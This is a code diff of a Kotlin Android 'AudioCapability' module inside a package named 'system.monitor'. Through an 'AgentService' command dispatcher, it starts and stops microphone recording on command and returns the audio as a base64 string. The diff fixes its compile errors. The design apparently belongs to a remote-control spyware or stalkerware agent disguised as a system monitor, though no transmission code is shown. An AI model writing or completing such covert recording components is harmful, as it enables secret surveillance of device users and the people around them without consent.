@@ -2,13 +2,10 @@ package com.system.monitor.capabilities
 
 import android.content.Context
 import android.media.MediaRecorder
-import android.os.Build
 import android.os.Environment
 import com.google.gson.Gson
 import com.system.monitor.AgentService
 import java.io.File
-import java.io.FileInputStream
-import java.util.concurrent.TimeUnit
 
 class AudioCapability(private val service: AgentService) : AgentService.Capability {
 
@@ -21,7 +18,7 @@ class AudioCapability(private val service: AgentService) : AgentService.Capabili
         return when (params.action) {
             "start" -> startRecording(params.duration ?: 30)
             "stop" -> stopRecording()
-            else -> mapOf("error" to "invalid action")
+            else -> mapOf<String, Any>("error" to "invalid action")
         }
     }
 
@@ -31,7 +28,7 @@ class AudioCapability(private val service: AgentService) : AgentService.Capabili
 
     private fun startRecording(duration: Int): Map<String, Any> {
         if (mediaRecorder != null) {
-            return mapOf("error" to "already_recording")
+            return mapOf<String, Any>("error" to "already_recording")
         }
         try {
             recordingFile = File(service.getExternalFilesDir(Environment.DIRECTORY_MUSIC), "audio_${System.currentTimeMillis()}.3gp")
@@ -43,9 +40,9 @@ class AudioCapability(private val service: AgentService) : AgentService.Capabili
                 prepare()
                 start()
             }
-            mapOf("status" to "recording_started", "file" to recordingFile!!.absolutePath)
+            return mapOf<String, Any>("status" to "recording_started", "file" to recordingFile!!.absolutePath)
         } catch (e: Exception) {
-            mapOf("error" to e.message ?: "recording_failed")
+            return mapOf<String, Any>("error" to (e.message ?: "recording_failed"))
         }
     }
 
@@ -55,7 +52,7 @@ class AudioCapability(private val service: AgentService) : AgentService.Capabili
                 stop()
                 release()
             } catch (e: Exception) {
-                return@run mapOf("error" to e.message ?: "stop_failed")
+                // ignore
             }
             mediaRecorder = null
         }
@@ -64,9 +61,9 @@ class AudioCapability(private val service: AgentService) : AgentService.Capabili
         return if (file != null && file.exists()) {
             val bytes = file.readBytes()
             val base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
-            mapOf("status" to "recording_stopped", "audio" to base64, "size" to bytes.size)
+            mapOf<String, Any>("status" to "recording_stopped", "audio" to base64, "size" to bytes.size)
         } else {
-            mapOf("status" to "recording_stopped", "audio" to "")
+            mapOf<String, Any>("status" to "recording_stopped", "audio" to "")
         }
     }
 
